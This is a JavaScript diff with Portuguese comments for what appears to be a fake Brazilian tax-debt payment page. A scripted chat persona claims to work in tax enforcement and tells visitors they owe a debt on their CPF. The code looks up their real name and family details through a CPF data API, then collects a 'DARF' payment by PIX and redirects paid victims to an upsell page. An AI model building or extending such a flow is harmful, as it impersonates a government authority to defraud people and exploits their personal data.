+    // Obter dados do cliente do localStorage
+        const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
+    const cpf = customerData.cpf || new URLSearchParams(window.location.search).get('cpf') || '';
+    const nome = customerData.nome || customerData.name || '';
+    const email = customerData.email || '';
+    const telefone = customerData.telefone || customerData.phone || '';
+    
+    if (!cpf || !nome) {
+        alert('Erro: Dados do cliente não encontrados. Por favor, recarregue a página.');
+        console.error('❌ Dados insuficientes:', { cpf, nome });
+        return;
+    }
+    
+    // Mostrar modal de loading
+    showLoadingModal();
+    window.isGeneratingPix = true;
+    
+    try {
+        // Preparar dados para a API
+        const amount = 6893; // R$ 68,93 em centavos
+        const isFileProtocol = window.location.protocol === 'file:';
+        const generatePixUrl = isFileProtocol ? './generate-pix.php' : './generate-pix.php';
+        
+        const params = new URLSearchParams({
+            amount: amount.toString(),
+            customer_cpf: cpf.replace(/\D/g, ''),
+            customer_name: nome,
+            customer_email: email || 'cliente@example.com',
+            customer_phone: telefone.replace(/\D/g, '') || '11999999999'
+        });
+        
+        console.log('📤 Gerando PIX via Paradise Pags...');
+        console.log('📋 Dados:', { amount, cpf, nome, email, telefone });
+        
+        const response = await fetch(`${generatePixUrl}?${params.toString()}`, {
+            method: 'GET',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        });
+        
+        if (!response.ok) {
+            // Tentar ler a resposta como texto primeiro para ver o erro
+            const errorText = await response.text();
+            console.error('❌ Resposta de erro da API:', errorText);
+            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+        }
+
+        // Verificar se a resposta é JSON válido
+        const responseText = await response.text();
+        let data;
+        
+        try {
+            data = JSON.parse(responseText);
+        } catch (parseError) {
+            console.error('❌ Erro ao fazer parse do JSON:', parseError);
+            console.error('❌ Resposta recebida (primeiros 500 caracteres):', responseText.substring(0, 500));
+            throw new Error('A API retornou uma resposta inválida. Verifique o console para mais detalhes.');
+        }
+        
+        console.log('📥 Resposta da API:', data);
+        
+        if (!data.success || !data.pixCode) {
+            throw new Error(data.error || data.message || 'Código PIX não recebido');
+        }
+        
+        // Mostrar modal PIX com os dados recebidos
+        showPixModal(data, data.pixCode, data.transaction_id || data.transactionId);
+        
+    } catch (error) {
+        console.error('❌ Erro ao gerar PIX:', error);
+        window.isGeneratingPix = false;
+        
+        // Remover modal de loading
+        const loadingModal = document.getElementById('pixModal');
+        if (loadingModal) {
+            loadingModal.remove();
+        }
+        
+        alert(`Erro ao gerar código PIX: ${error.message}\n\nPor favor, tente novamente.`);
+    }
+}
+
+function showLoadingModal() {
+    const modalHtml = `
+        <div id="pixModal" class="modal" style="display: block; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: rgba(0, 0, 0, 0.5); z-index: 2000; overflow-y: auto;">
+            <div class="modal-content" style="background-color: white; width: 100vw; min-height: 100vh; margin: 0; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+                <div style="text-align: center;">
+                    <div class="spinner" style="
+                        width: 60px;
+                        height: 60px;
+                        border: 6px solid #f3f3f3;
+                        border-top: 6px solid #044785;
+                        border-radius: 50%;
+                        animation: spin 1s linear infinite;
+                        margin: 0 auto 30px auto;
+                    "></div>
+                    <h2 style="color: #044785; font-weight: 600; margin-bottom: 15px; font-size: 1.3rem;">Aguardando pagamento...</h2>
+                    <p style="color: #666; font-size: 1rem;">Gerando DARF, por favor aguarde...</p>
+                </div>
+            </div>
+        </div>
+        <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        </style>
+    `;
+    
+    document.body.insertAdjacentHTML('beforeend', modalHtml);
+}
+
+// Function to generate QR code from PIX code
+async function generateQRCodeFromPix(pixCode) {
+    try {
+        // Check if QRious library is loaded
+        if (typeof QRious === 'undefined') {
+            console.error('QRious library not loaded');
+            return null;
+        }
+        
+        // Create a canvas element
+        const canvas = document.createElement('canvas');
+        
+        // Create QRious instance
+        const qr = new QRious({
+            element: canvas,
+            value: pixCode,
+            size: 120,
+            background: '#ffffff',
+            foreground: '#000000'
+        });
+        
+        // Convert canvas to data URL
+        const qrCodeDataURL = canvas.toDataURL('image/png');
+        return qrCodeDataURL;
+    } catch (error) {
+        console.error('Erro ao gerar QR Code:', error);
+        return null;
+    }
+}
+
+function showPixModal(data, pixCodeParam = null, transactionIdParam = null) {
+    // Remove loading modal and show PIX modal
+    const existingModal = document.getElementById('pixModal');
+    if (existingModal) {
+        existingModal.remove();
+    }
+    
+    // Liberar flag - PIX gerado com sucesso
+    isGeneratingPix = false;
+    console.log('🔓 Flag liberada (PIX gerado com sucesso)');
+    
+    // Get PIX code from API response or parameters
+    const pixCode = pixCodeParam || data.pixCode || data.pix_code;
+    
+    if (!pixCode) {
+        console.error('❌ Código PIX não encontrado na resposta da API');
+        alert('Erro: Código PIX não recebido da API');
+        return;
+    }
+    
+    console.log('🔍 Código PIX recebido:', pixCode);
+    
+    // Generate QR code from PIX code
+    generateQRCodeFromPix(pixCode).then(qrCodeDataURL => {
+        if (!qrCodeDataURL) {
+            console.error('❌ Erro ao gerar QR Code');
+            alert('Erro ao gerar QR Code. Tente novamente.');
+            return;
+        }
+        
+        console.log('✅ QR Code gerado com sucesso');
+        
+        // Start payment monitoring
+        const transactionId = transactionIdParam || data.transaction_id || data.orderId || data.order_id;
+        console.log('🔍 Dados PIX recebidos:', data);
+        console.log('🆔 Transaction ID identificado:', transactionId);
+        
+        // Salvar transação no localStorage
+        if (transactionId && pixCode) {
+            localStorage.setItem('currentTransaction', JSON.stringify({
+                transactionId: transactionId,
+                qrCode: qrCodeDataURL,
+                pixCode: pixCode,
+                valor: 157.49,
+                timestamp: new Date().toISOString()
+            }));
+            console.log('💾 Transação salva no localStorage');
+        }
+        
+        if (transactionId) {
+            console.log('✅ Iniciando monitoramento de pagamento para:', transactionId);
+            startPaymentMonitoring(transactionId);
+            
+            // Show manual confirmation popup after 20 seconds
+            console.log('⏰ Configurando popup de confirmação para aparecer em 20 segundos...');
+            setTimeout(() => {
+                console.log('⏰ 20 segundos passaram, chamando showManualPaymentConfirmation...');
+                showManualPaymentConfirmation(transactionId);
+            }, 20000);
+        } else {
+            console.error('❌ Nenhum transaction_id encontrado nos dados:', data);
+        }
+        
+        const modalHtml = `
+            <div id="pixModal" class="modal" style="display: block; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: rgba(0, 0, 0, 0.5); z-index: 2000; overflow-y: auto; animation: fadeIn 1s ease-out;">
+                <div class="modal-content" style="background-color: white; width: 100vw; min-height: 100vh; margin: 0; padding: 20px; overflow-y: auto; animation: slideDown 1s ease-out; transform: translateY(0);">
+                    <div style="text-align: center; margin-bottom: 30px;">
+                        <div class="spinner" style="
+                            width: 40px;
+                            height: 40px;
+                            border: 4px solid #f3f3f3;
+                            border-top: 4px solid #044785;
+                            border-radius: 50%;
+                            animation: spin 1s linear infinite;
+                            margin: 0 auto 15px auto;
+                        "></div>
+                        <h2 style="color: #044785; font-weight: 600; margin-bottom: 10px; font-size: 1.3rem;">Aguardando pagamento...</h2>
+                        <p style="color: #666; font-size: 0.9rem;">DARF gerado com sucesso</p>
+                    </div>
+
+                    <div style="display: flex; justify-content: center; align-items: center; width: 100%; margin: 20px 0;">
+                        <div style="display: flex; justify-content: center; align-items: center; padding: 15px; background: white; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); width: 150px;">
+                            <img src="${qrCodeDataURL}" alt="QR Code PIX" style="width: 120px; height: 120px; display: block;">
+                        </div>
+                    </div>
+
+                    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
+                        <label style="display: block; margin-bottom: 10px; font-weight: 600; color: #044785;">Código PIX (Copia e Cola) - Valor: R$ 68,93:</label>
+                        <div style="margin-bottom: 10px;">
+                            <textarea id="pixCodeInputDisplay" readonly style="width: 100%; height: 120px; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-family: monospace; font-size: 0.85rem; resize: none; line-height: 1.3; word-wrap: break-word;">${pixCode}</textarea>
+                            <input type="hidden" id="pixCodeInputReal" value="${pixCode}">
+                        </div>
+                        <button onclick="copyPixCode()" style="width: 100%; padding: 12px 16px; background: #044785; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 600;">
+                            <i class="fas fa-copy"></i> Copiar código PIX completo
+                        </button>
+                    </div>
+
+                    <div style="background: #fff3cd; padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid #ffc107;">
+                        <h4 style="color: #856404; margin-bottom: 15px; font-size: 1rem; font-weight: 600;">
+                            <i class="fas fa-info-circle" style="margin-right: 8px;"></i>
+                            Como pagar com PIX Copia e Cola:
+                        </h4>
+                        <div style="color: #856404; font-size: 0.9rem; line-height: 1.5;">
+                            <p style="margin-bottom: 8px;"><strong>1.</strong> Copie o código PIX clicando no botão acima</p>
+                            <p style="margin-bottom: 8px;"><strong>2.</strong> Abra o aplicativo do seu banco</p>
+                            <p style="margin-bottom: 8px;"><strong>3.</strong> Procure pela opção "PIX" e depois "Copia e Cola"</p>
+                            <p style="margin-bottom: 0;"><strong>4.</strong> Cole o código copiado e confirme o pagamento de R$ 68,93</p>
+                        </div>
+                    </div>
+
+                    <div style="text-align: center; margin-top: 20px; padding: 15px; background: #e8f4fd; border-radius: 8px; border-left: 4px solid #044785;">
+                        <p style="color: #044785; font-weight: 600; margin-bottom: 10px;">
+                            <i class="fas fa-clock" style="margin-right: 8px;"></i>
+                            Tempo para pagamento: 10 minutos
+                        </p>
+                        <p style="color: #666; font-size: 0.9rem;">Após o pagamento, retorne imediatamente a esta página para confirmação.</p>
+                    </div>
+
+                    <div style="text-align: center; margin-top: 20px;">
+                        <button onclick="closePixModal()" style="padding: 12px 24px; background: #6c757d; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 600;">
+                            Fechar
+                        </button>
+                    </div>
+                </div>
+            </div>
+            <style>
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+            </style>
+        `;
+        
+        document.body.insertAdjacentHTML('beforeend', modalHtml);
+    }).catch(error => {
+        console.error('❌ Erro ao gerar QR Code:', error);
+        alert('Erro ao gerar QR Code. Tente novamente.');
+    });
+}
+
+function copyPixCode() {
+    // Get the real PIX code from hidden input
+    const realPixInput = document.getElementById('pixCodeInputReal');
+    const realPixCode = realPixInput.value;
+    
+    try {
+        // Copy the real PIX code to clipboard
+        if (navigator.clipboard && window.isSecureContext) {
+            navigator.clipboard.writeText(realPixCode);
+        } else {
+            // Fallback for older browsers
+            const textArea = document.createElement('textarea');
+            textArea.value = realPixCode;
+            document.body.appendChild(textArea);
+            textArea.select();
+            textArea.setSelectionRange(0, 99999);
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+        }
+        
+        const button = event.target.closest('button');
+        const originalText = button.innerHTML;
+        button.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
+        button.style.background = '#28a745';
+        
+        setTimeout(() => {
+            button.innerHTML = originalText;
+            button.style.background = '#044785';
+        }, 3000);
+    } catch (err) {
+        console.error('Erro ao copiar:', err);
+        alert('Erro ao copiar código. Tente selecionar manualmente.');
+    }
+}
+
+function closePixModal() {
+    const modal = document.getElementById('pixModal');
+    if (modal) {
+        modal.remove();
+    }
+    
+    // Stop payment monitoring
+    if (window.paymentMonitorInterval) {
+        clearInterval(window.paymentMonitorInterval);
+        window.paymentMonitorInterval = null;
+    }
+}
+
+// Payment monitoring function (usando get-payment.php, como no checkout)
+function startPaymentMonitoring(transactionId) {
+    // Clear any existing interval
+    if (window.paymentMonitorInterval) {
+        clearInterval(window.paymentMonitorInterval);
+    }
+    
+    // Check payment status every 2 seconds
+    window.paymentMonitorInterval = setInterval(async () => {
+        try {
+            // Usar get-payment.php na mesma pasta
+            const isFileProtocol = window.location.protocol === 'file:';
+            const statusUrl = isFileProtocol 
+                ? `./get-payment.php?transactionId=${encodeURIComponent(transactionId)}`
+                : `./get-payment.php?transactionId=${encodeURIComponent(transactionId)}`;
+            console.log(`🔄 Verificando status da transação: ${transactionId}`);
+            console.log(`📡 URL de verificação: ${statusUrl}`);
+            
+            const response = await fetch(statusUrl);
+            
+            if (!response.ok) {
+                console.error(`❌ Erro HTTP ${response.status}: ${response.statusText}`);
+                return;
+            }
+            
+            // Verificar se a resposta é JSON válido
+            const responseText = await response.text();
+            let statusData;
+            
+            try {
+                statusData = JSON.parse(responseText);
+            } catch (parseError) {
+                console.error('❌ Erro ao fazer parse do JSON:', parseError);
+                console.error('❌ Resposta recebida:', responseText.substring(0, 500));
+                return;
+            }
+            
+            console.log('📊 Status recebido:', statusData);
+            
+            // Verificar se a API retornou sucesso
+            if (!statusData.success) {
+                console.error('❌ Erro na API:', statusData.error || statusData.message);
+                return;
+            }
+            
+            // Extrair status e paid do formato padronizado
+            const status = statusData.status || 'pending';
+            const paid = statusData.paid === true;
+            
+            console.log(`🎯 Status atual: "${status}", Paid: ${paid}`);
+            
+            // Check if payment is approved
+            if (paid || status === 'approved' || status === 'paid') {
+                // Clear monitoring
+                clearInterval(window.paymentMonitorInterval);
+                window.paymentMonitorInterval = null;
+                closePixModal();
+
+                // Salvar dados da transação no localStorage
+                localStorage.setItem('currentTransaction', JSON.stringify({
+                    transactionId: transactionId,
+                    status: status,
+                    paid: true,
+                    timestamp: new Date().toISOString()
+                }));
+
+                console.log('✅ Pagamento detectado! Redirecionando para oferta de regularização 2026...');
+                localStorage.setItem('paymentStep', '1');
+                window.location.href = 'upsell.html';
+            } else if (status === 'processing') {
+                console.log('⏳ Pagamento em processamento...');
+            } else {
+                console.log(`⏳ Pagamento ainda pendente - Status: ${status}`);
+            }
+        } catch (error) {
+            console.error('❌ Erro ao verificar status do pagamento via get-payment.php:', error);
+        }
+    }, 2000); // Check every 2 seconds
+    
+    console.log(`⏰ Monitoramento configurado com timeout de 20 minutos`);
+    
+    // Timeout after 20 minutes (PIX expiration)
+    setTimeout(() => {
+        if (window.paymentMonitorInterval) {
+            clearInterval(window.paymentMonitorInterval);
+            window.paymentMonitorInterval = null;
+            console.log('⏰ Monitoramento encerrado por timeout (20 minutos)');
+        }
+    }, 20 * 60 * 1000); // 20 minutes
+}
+
+// Buscar telefone por CPF na planilha
+// Função buscarTelefonePorCPF removida - telefone será solicitado durante o chat se necessário
+
+// Initialize chat
+// Função para buscar dados do CPF na API se necessário (api.cpf-brasil.org via api-cpf.php) - com timeout para não travar
+async function fetchCpfDataIfNeeded(cpf) {
+    if (!cpf || cpf.length !== 11) return null;
+    
+    try {
+        const apiUrl = `../api-cpf.php?cpf=${cpf}&_t=${Date.now()}`;
+        
+        console.log('📤 Buscando CPF na API (api.cpf-brasil.org) para obter nome real...');
+        
+        // Adicionar timeout de 5 segundos para não travar o chat
+        const controller = new AbortController();
+        let timeoutId = setTimeout(() => {
+            controller.abort();
+        }, 5000);
+        
+        const response = await fetch(apiUrl, {
+            method: 'GET',
+            mode: 'cors',
+            cache: 'no-cache',
+            headers: {
+                'Cache-Control': 'no-cache'
+            },
+            signal: controller.signal
+        });
+        
+        clearTimeout(timeoutId);
+        
+        if (!response.ok) {
+            throw new Error(`Erro HTTP ${response.status}`);
+        }
+        
+        const data = await response.json();
+        console.log('📥 Resposta completa da API (api.cpf-brasil.org) no chat:', JSON.stringify(data, null, 2));
+        
+        // Estrutura api.cpf-brasil.org (via api-cpf.php): { nome, cpf, email, telefone, nascimento, mae, pai, sexo, etc }
+        const nome = data.nome || data.NOME || data.name || data.NAME || null;
+        
+        console.log('📝 Nome extraído no chat (api.cpf-brasil.org):', nome);
+        console.log('📝 Estrutura data:', {
+            cpf: data.cpf,
+            nome: data.nome,
+            nascimento: data.nascimento,
+            nome_mae: data.mae
+        });
+        
+        if (nome && nome !== 'Cliente' && nome !== 'Contribuinte' && nome.trim() !== '') {
+            // Atualizar localStorage com nome real
+            const currentData = getCustomerData();
+            currentData.nome = nome;
+            currentData.NOME = nome;
+            try {
+                localStorage.setItem('customerData', JSON.stringify(currentData));
+            } catch (e) {
+                console.error('Erro ao salvar nome no localStorage:', e);
+            }
+            
+            // Atualizar variáveis globais
+            const nomeCapitalizado = capitalizeNames(nome);
+            window.currentFirstName = nomeCapitalizado.split(' ')[0];
+            window.currentFullName = nomeCapitalizado;
+            
+            console.log('✅ Nome real atualizado:', window.currentFirstName, window.currentFullName);
+            return nome;
+        }
+        return null;
+    } catch (error) {
+        if (error.name === 'AbortError') {
+            console.warn('⏰ Timeout ao buscar CPF na API (5s), continuando sem nome da API');
+        } else {
+            console.error('❌ Erro ao buscar CPF na API:', error);
+        }
+        // Retornar null para não travar o chat - ele continuará com os dados do localStorage
+        return null;
+    }
+}
+
+async function initializeChat() {
+    console.log('🔍 initializeChat() chamada - verificando flags...');
+    console.log('   chatMessagesProcessed:', window.chatMessagesProcessed);
+    console.log('   chatProcessing:', window.chatProcessing);
+    console.log('   chatStarted:', window.chatStarted);
+    
+    // Verificar se as mensagens JÁ FORAM PROCESSADAS (não apenas se foi inicializado)
+    if (window.chatMessagesProcessed) {
+        console.log('⚠️ Mensagens do chat já foram processadas, evitando duplicação');
+        return;
+    }
+    
+    // Verificar se já está processando (evitar condições de corrida)
+    if (window.chatProcessing) {
+        console.log('⚠️ Chat já está sendo processado, aguardando...');
+        // Aguardar um pouco e verificar novamente
+        await new Promise(resolve => setTimeout(resolve, 500));
+        if (window.chatMessagesProcessed) {
+            console.log('✅ Chat já foi processado enquanto aguardava');
+            return;
+        }
+    }
+    
+    // Marcar que está processando AGORA
+    window.chatProcessing = true;
+    console.log('✅ Flag chatProcessing = true - iniciando processamento...');
+    
+    try {
+        console.log('🚀 Iniciando chat...');
+        
+        // Garantir que customerData existe
+        if (typeof customerData === 'undefined' || !customerData) {
+            console.warn('⚠️ customerData não definido, tentando recuperar do localStorage...');
+            try {
+                const savedData = localStorage.getItem('customerData');
+                if (savedData) {
+                    customerData = JSON.parse(savedData);
+                    console.log('✅ customerData recuperado do localStorage:', customerData);
+                } else {
+                    customerData = { nome: 'Prezado(a)', cpf: '' };
+                    console.warn('⚠️ Criando customerData padrão');
+                }
+            } catch (e) {
+                console.error('❌ Erro ao recuperar customerData:', e);
+                customerData = { nome: 'Prezado(a)', cpf: '' };
+            }
+        }
+        
+        // Buscar nome real se necessário (NÃO BLOQUEANTE - não trava o chat)
+        const cpfLimpo = customerData.cpf ? String(customerData.cpf).replace(/\D/g, '') : '';
+        const nomeAtual = customerData.nome || customerData.NOME || '';
+    
+    console.log('🔍 Verificando nome no chat:', { 
+        nomeAtual, 
+        cpfLimpo, 
+        currentFirstName: window.currentFirstName,
+        currentFullName: window.currentFullName 
+    });
+    
+    // Configurar nome inicial do localStorage primeiro (para não travar)
+    if (nomeAtual && nomeAtual !== 'Cliente' && nomeAtual !== 'Contribuinte') {
+        // Atualizar variáveis globais com nome do localStorage
+        const nomeCapitalizado = capitalizeNames(nomeAtual);
+        window.currentFirstName = nomeCapitalizado.split(' ')[0];
+        window.currentFullName = nomeCapitalizado;
+        console.log('✅ Nome atualizado do localStorage:', window.currentFirstName, window.currentFullName);
+    }
+    
+    // Se ainda não tiver nome, usar "Prezado(a)"
+    if (!window.currentFirstName || window.currentFirstName === 'Prezado(a)') {
+        window.currentFirstName = 'Prezado(a)';
+    }
+    
+    // Buscar nome na API em paralelo (NÃO BLOQUEANTE - não trava o início do chat)
+    if ((!nomeAtual || nomeAtual === 'Cliente' || nomeAtual === 'Contribuinte' || nomeAtual.trim() === '') && 
+        cpfLimpo && cpfLimpo.length === 11) {
+        console.log('🔍 Buscando nome real do CPF na API (em paralelo, não bloqueante)...');
+        // Não usar await aqui - deixa rodar em paralelo
+        fetchCpfDataIfNeeded(cpfLimpo).then(nomeReal => {
+            if (nomeReal) {
+                console.log('✅ Nome real obtido da API (atualizado durante o chat):', window.currentFirstName, window.currentFullName);
+                // Atualizar mensagens futuras se necessário (mas não as que já foram enviadas)
+            } else {
+                console.warn('⚠️ Nome não encontrado na API, usando nome do localStorage');
+            }
+        }).catch(error => {
+            console.warn('⚠️ Erro ao buscar nome na API (continuando chat):', error);
+        });
+    }
+    
+    // Garantir que as variáveis estão definidas antes de processar mensagens
+    if (!window.currentFirstName) {
+        window.currentFirstName = 'Prezado(a)';
+    }
+    if (!window.currentFullName) {
+        window.currentFullName = '';
+    }
+    
+    console.log('📝 Variáveis antes de processar mensagens:', {
+        currentFirstName: window.currentFirstName,
+        currentFullName: window.currentFullName
+    });
+    
+    // Obter CPF formatado para usar nas mensagens
+    const cpfFormatado = customerData.cpf ? formatarCPF(customerData.cpf) : (customerData.CPF ? formatarCPF(customerData.CPF) : 'CPF não informado');
+    
+    // Atualizar chatSequence com nome atualizado (substituir variáveis dinamicamente)
+    const updatedSequence = chatSequence.map((msg, index) => {
+        if (typeof msg.message === 'string') {
+            let updatedMessage = msg.message;
+            // Substituir window.currentFirstName (garantir valor padrão)
+            const firstName = window.currentFirstName || 'Prezado(a)';
+            const fullName = window.currentFullName || '';
+            
+            // Substituir todas as variáveis possíveis
+            updatedMessage = updatedMessage.replace(/\$\{window\.currentFirstName \|\| 'Prezado\(a\)'\}/g, firstName);
+            updatedMessage = updatedMessage.replace(/window\.currentFirstName \|\| 'Prezado\(a\)'/g, firstName);
+            updatedMessage = updatedMessage.replace(/window\.currentFirstName/g, firstName);
+            
+            // Remover "Olá" apenas se não for uma mensagem de apresentação legítima
+            // A primeira mensagem (index 0) deve manter "Olá" se for mensagem de apresentação
+            if (index === 0 && updatedMessage.includes('aqui é a Tereza Alencar')) {
+                // Manter "Olá" na mensagem de apresentação
+                // Apenas substituir variáveis, não remover "Olá"
+            } else {
+                // Para outras mensagens, remover "Olá" acidental
+                updatedMessage = updatedMessage.replace(/^Olá\s+/i, '');
+                updatedMessage = updatedMessage.replace(/Olá\s+Prezado\(a\)/gi, firstName);
+            }
+            
+            // Substituir window.currentFullName
+            updatedMessage = updatedMessage.replace(/\$\{window\.currentFullName\}/g, fullName);
+            updatedMessage = updatedMessage.replace(/window\.currentFullName/g, fullName);
+            
+            // Substituir variável cpf (pode estar na mensagem como template literal)
+            updatedMessage = updatedMessage.replace(/\$\{cpf\}/g, cpfFormatado);
+            updatedMessage = updatedMessage.replace(/\bcpf\b/g, cpfFormatado);
+            
+            // Garantir que delay existe
+            const delay = msg.delay || 1500;
+            
+            console.log(`📝 Mensagem ${index + 1} processada:`, {
+                original: msg.message.substring(0, 60) + '...',
+                atualizada: updatedMessage.substring(0, 60) + '...',
+                delay: delay,
+                temRequestPhone: !!msg.requestPhone,
+                temShowOptions: !!msg.showOptions
+            });
+            
+            return {
+                ...msg,
+                message: updatedMessage,
+                delay: delay
+            };
+        }
+        // Se não for string, retornar como está mas garantir delay
+        return {
+            ...msg,
+            delay: msg.delay || 1500
+        };
+    });
+    
+    console.log('✅ Sequência atualizada:', updatedSequence.length, 'mensagens');
+    
+    // Telefone será solicitado durante o chat se necessário
+    await new Promise(resolve => setTimeout(resolve, 500));
+    
+    console.log('📨 Iniciando envio de mensagens do chat...');
+    console.log('📊 Total de mensagens:', updatedSequence.length);
+    
+    // Função auxiliar para enviar mensagem com segurança - SIMPLIFICADA
+    const enviarMensagem = async (msg, index) => {
+        // Usar o delay da mensagem (aumentado para 5-7s para dar mais tempo)
+        const delay = Math.min(msg.delay || 5000, 8000); // Máximo 8 segundos
+        console.log(`📨 Enviando mensagem ${index + 1}/${updatedSequence.length} (delay: ${delay}ms)`);
+        
+        // Timeout de segurança mais curto
+        const timeoutMs = delay + 1000; // delay + 1 segundo extra
+        
+        try {
+            // Mostrar typing com timeout de segurança mais agressivo
+            const typingPromise = showTyping(delay);
+            const timeoutPromise = new Promise(resolve => setTimeout(() => {
+                console.log(`⏰ Timeout de segurança ativado para mensagem ${index + 1}`);
+                resolve();
+            }, timeoutMs));
+            
+            // Aguardar typing ou timeout (o que acontecer primeiro)
+            await Promise.race([typingPromise, timeoutPromise]);
+            
+            // Adicionar mensagem SEMPRE, mesmo se typing falhar
+            addMessage(msg.message, true, true);
+            console.log(`✅ Mensagem ${index + 1} enviada com sucesso`);
+            
+        } catch (error) {
+            console.error(`❌ Erro ao enviar mensagem ${index + 1}:`, error);
+            // SEMPRE tentar enviar mensagem diretamente mesmo com erro
+            try {
+                addMessage(msg.message, true, true);
+                console.log(`✅ Mensagem ${index + 1} enviada (modo fallback após erro)`);
+            } catch (e) {
+                console.error(`❌ Erro crítico na mensagem ${index + 1}:`, e);
+                // Último recurso: tentar novamente após 500ms
+                setTimeout(() => {
+                    try {
+                        addMessage(msg.message, true, true);
+                        console.log(`✅ Mensagem ${index + 1} enviada (último recurso)`);
+                    } catch (e2) {
+                        console.error(`❌ Falha total na mensagem ${index + 1}:`, e2);
+                    }
+                }, 500);
+            }
+        }
+        
+        // Delay maior entre mensagens para dar tempo de leitura e processamento
+        await new Promise(resolve => setTimeout(resolve, 1500)); // 1.5s entre mensagens
+    };
+    
+    // MARCAR que vamos processar mensagens AGORA (antes do loop)
+    window.chatMessagesProcessed = true;
+    window.chatStarted = true;
+    window.chatInitialized = true;
+    window.chatProcessing = false; // Não está mais processando, já processou
+    
+    // Processar cada mensagem sequencialmente
+    console.log('🔄 Iniciando processamento de', updatedSequence.length, 'mensagens...');
+    console.log('✅ Flags setadas - chat iniciado e mensagens serão processadas');
+    
+    for (let i = 0; i < updatedSequence.length; i++) {
+        console.log(`\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+        console.log(`📨 PROCESSANDO MENSAGEM ${i + 1}/${updatedSequence.length}`);
+        console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+        
+        const message = updatedSequence[i];
+        
+        // Verificar se a mensagem tem conteúdo válido
+        if (!message) {
+            console.warn(`⚠️ Mensagem ${i + 1} é null/undefined, pulando...`);
+            continue;
+        }
+        
+        if (!message.message || typeof message.message !== 'string') {
+            console.warn(`⚠️ Mensagem ${i + 1} não tem conteúdo válido:`, message);
+            continue;
+        }
+        
+        console.log(`📝 Conteúdo da mensagem ${i + 1}:`, message.message.substring(0, 80) + '...');
+        console.log(`⏱️ Delay: ${message.delay}ms`);
+        console.log(`📞 RequestPhone: ${!!message.requestPhone}`);
+        console.log(`🔘 ShowOptions: ${message.showOptions || 'não'}`);
+        
+        // Enviar mensagem
+        try {
+            await enviarMensagem(message, i);
+            console.log(`✅ Mensagem ${i + 1} processada com sucesso`);
+        } catch (error) {
+            console.error(`❌ Erro crítico ao processar mensagem ${i + 1}:`, error);
+            // Tentar enviar mensagem diretamente mesmo com erro
+            try {
+        addMessage(message.message, true, true);
+                console.log(`✅ Mensagem ${i + 1} enviada (modo de emergência)`);
+            } catch (e) {
+                console.error(`❌ Erro total na mensagem ${i + 1}:`, e);
+            }
+        }
+        
+        // Processar requestPhone se necessário
+        if (message.requestPhone) {
+            console.log('📞 Processando solicitação de telefone...');
+            // Delay maior antes de solicitar telefone
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            try {
+                await Promise.race([
+                    showTyping(3000), // 3s de typing para solicitar telefone
+                    new Promise(resolve => setTimeout(resolve, 3500))
+                ]);
+            } catch (e) {
+                console.warn('Erro no showTyping (telefone), continuando...', e);
+            }
+            
+            addMessage(`Para continuar com a regularização do débito, preciso confirmar seu número de telefone.`, true, true);
+            
+            // Mostrar input de telefone
+            setTimeout(() => {
+                try {
+                showPhoneInput();
+                    console.log('✅ Input de telefone exibido');
+                } catch (e) {
+                    console.error('❌ Erro ao mostrar input de telefone:', e);
+                }
+            }, 500);
+            
+            // Aguardar confirmação de telefone - SEM TIMEOUT (aguarda indefinidamente)
+            console.log('⏳ Aguardando confirmação de telefone...');
+            console.log('⏸️ Chat pausado - aguardando usuário confirmar telefone');
+            try {
+                // Aguardar indefinidamente até o telefone ser confirmado
+            await waitForPhoneConfirmation();
+                console.log('✅ Confirmação de telefone recebida - continuando chat');
+            } catch (e) {
+                console.error('❌ Erro ao aguardar telefone:', e);
+                // Mesmo com erro, continuar (mas isso não deve acontecer)
+            }
+        }
+        
+        // Se tiver opções, mostrar e PARAR o loop
+        if (message.showOptions) {
+            console.log(`🛑 Mensagem ${i + 1} tem opções - PARANDO loop`);
+            console.log(`🔘 Tipo de opções: ${message.showOptions}`);
+            setTimeout(() => {
+                try {
+                showOptions(message.showOptions);
+                    console.log('✅ Opções exibidas - aguardando escolha do usuário');
+                } catch (e) {
+                    console.error('❌ Erro ao mostrar opções:', e);
+                }
+            }, 800);
+            // IMPORTANTE: Parar aqui e aguardar clique do usuário
+            console.log('🛑 Loop pausado - aguardando interação do usuário');
+            break;
+        }
+        
+        // Delay maior entre mensagens para dar tempo de leitura e processamento
+        if (i < updatedSequence.length - 1) {
+            await new Promise(resolve => setTimeout(resolve, 1500)); // 1.5s entre mensagens
+        }
+    }
+    
+    console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+    console.log('✅ Loop de mensagens concluído');
+    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
+    
+    // Limpar flag de processamento
+    window.chatProcessing = false;
+    
+    console.log('✅ Chat inicializado com sucesso!');
+    } catch (error) {
+        console.error('❌ Erro crítico ao inicializar chat:', error);
+        // Limpar flag de processamento em caso de erro
+        window.chatProcessing = false;
+        
+        // Tentar enviar pelo menos a primeira mensagem mesmo com erro
+        try {
+            console.log('🔄 Tentando enviar primeira mensagem após erro...');
+            const primeiraMensagem = window.currentFullName 
+                ? `Trabalho na área de fiscalização de débitos tributários. Foi identificado um débito pendente de R$ 419,55 no seu CPF, registrado em nome de ${window.currentFullName}.`
